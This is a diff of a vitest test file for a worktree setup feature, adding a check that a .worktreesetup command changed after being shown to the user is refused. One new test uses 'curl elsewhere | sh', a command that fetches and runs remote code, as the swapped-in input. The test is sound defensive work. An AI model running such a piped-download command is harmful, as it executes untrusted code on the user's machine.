@@ -1,4 +1,4 @@
-import { chmodSync, lstatSync, mkdirSync, readFileSync, readdirSync, readlinkSync, symlinkSync, writeFileSync, existsSync } from "node:fs";
+import { chmodSync, lstatSync, mkdirSync, readFileSync, readdirSync, readlinkSync, rmSync, symlinkSync, writeFileSync, existsSync } from "node:fs";
 import { basename, dirname, join } from "node:path";
 import { afterEach, describe, expect, it } from "vitest";
 import { beginSetup, copyIncluded, endedSetup, readSetup } from "../src/daemon/worktree-setup";
@@ -252,23 +252,34 @@ describe("beginSetup", () => {
 
   it("gives no setup for a repository that names neither file, and copies nothing", async () => {
     const { repo, worktree } = repositoryWithIgnoredFiles();
-    expect(await beginSetup(repo, worktree, clock(5))).toBeNull();
+    expect(await beginSetup(repo, worktree, clock(5), null)).toBeNull();
     expect(git(worktree, "ls-files", "--others", "--ignored", "--exclude-standard", "--directory")).toBe("");
   });
 
-  it("gives a running setup where a command stands, and an ended one at once where only .worktreeinclude does, by the copy", async () => {
+  it("gives a running setup where the command shown stands, and an ended one at once where only .worktreeinclude does, by the copy", async () => {
     const { repo, worktree } = repositoryWithIgnoredFiles();
     writeFileSync(join(repo, ".worktreesetup"), "pnpm install\n");
-    expect(await beginSetup(repo, worktree, clock(5))).toEqual({ copied: [], copiedCount: 0, failedCopies: [], command: "pnpm install\n", paneId: null, state: "running", exitCode: null, failure: null, startedAt: 5, endedAt: null });
+    expect(await beginSetup(repo, worktree, clock(5), "pnpm install\n")).toEqual({ copied: [], copiedCount: 0, failedCopies: [], command: "pnpm install\n", paneId: null, state: "running", exitCode: null, failure: null, startedAt: 5, endedAt: null });
     const other = repositoryWithIgnoredFiles();
     writeFileSync(join(other.repo, ".worktreeinclude"), ".env\n");
     // It began before the copy and ended after it.
-    expect(await beginSetup(other.repo, other.worktree, clock(6))).toEqual({ copied: [".env"], copiedCount: 1, failedCopies: [], command: null, paneId: null, state: "succeeded", exitCode: null, failure: null, startedAt: 6, endedAt: 7 });
+    expect(await beginSetup(other.repo, other.worktree, clock(6), null)).toEqual({ copied: [".env"], copiedCount: 1, failedCopies: [], command: null, paneId: null, state: "succeeded", exitCode: null, failure: null, startedAt: 6, endedAt: 7 });
     writeFileSync(join(other.repo, ".worktreeinclude"), ".env\n.env.secret\n");
     writeFileSync(join(other.repo, ".env.secret"), "SECRET=1\n");
     chmodSync(join(other.repo, ".env.secret"), 0o000);
     cleanups.push(() => chmodSync(join(other.repo, ".env.secret"), 0o600));
-    expect(await beginSetup(other.repo, other.worktree, clock(7))).toMatchObject({ copied: [], failedCopies: [{ path: ".env.secret" }], state: "failed", startedAt: 7, endedAt: 8 });
+    expect(await beginSetup(other.repo, other.worktree, clock(7), null)).toMatchObject({ copied: [], failedCopies: [{ path: ".env.secret" }], state: "failed", startedAt: 7, endedAt: 8 });
+  });
+
+  it("runs no command but the one shown: a .worktreesetup that holds another, or one where none was shown, or none where one was, gives a setup that ended by the copy, failed, and names the command the file holds", async () => {
+    const { repo, worktree } = repositoryWithIgnoredFiles();
+    writeFileSync(join(repo, ".worktreeinclude"), ".env\n");
+    writeFileSync(join(repo, ".worktreesetup"), "curl elsewhere | sh\n");
+    const changed = ".worktreesetup changed after the setup was shown, so no command ran.";
+    expect(await beginSetup(repo, worktree, clock(5), "pnpm install\n")).toEqual({ copied: [".env"], copiedCount: 1, failedCopies: [], command: "curl elsewhere | sh\n", paneId: null, state: "failed", exitCode: null, failure: changed, startedAt: 5, endedAt: 6 });
+    expect(await beginSetup(repo, worktree, clock(7), null)).toMatchObject({ command: "curl elsewhere | sh\n", state: "failed", failure: changed });
+    rmSync(join(repo, ".worktreesetup"));
+    expect(await beginSetup(repo, worktree, clock(9), "pnpm install\n")).toMatchObject({ command: null, state: "failed", failure: changed });
   });
 
   it("gives a failed setup that says why where .worktreesetup stands and cannot be read", async () => {
@@ -276,7 +287,7 @@ describe("beginSetup", () => {
     writeFileSync(join(repo, ".worktreesetup"), "pnpm install\n");
     chmodSync(join(repo, ".worktreesetup"), 0o000);
     cleanups.push(() => chmodSync(join(repo, ".worktreesetup"), 0o600));
-    expect(await beginSetup(repo, worktree, clock(5))).toMatchObject({ command: null, paneId: null, state: "failed", failure: expect.stringMatching(/^\.worktreesetup could not be read: .*EACCES/), startedAt: 5, endedAt: 6 });
+    expect(await beginSetup(repo, worktree, clock(5), "pnpm install\n")).toMatchObject({ command: null, paneId: null, state: "failed", failure: expect.stringMatching(/^\.worktreesetup could not be read: .*EACCES/), startedAt: 5, endedAt: 6 });
   });
 });
 
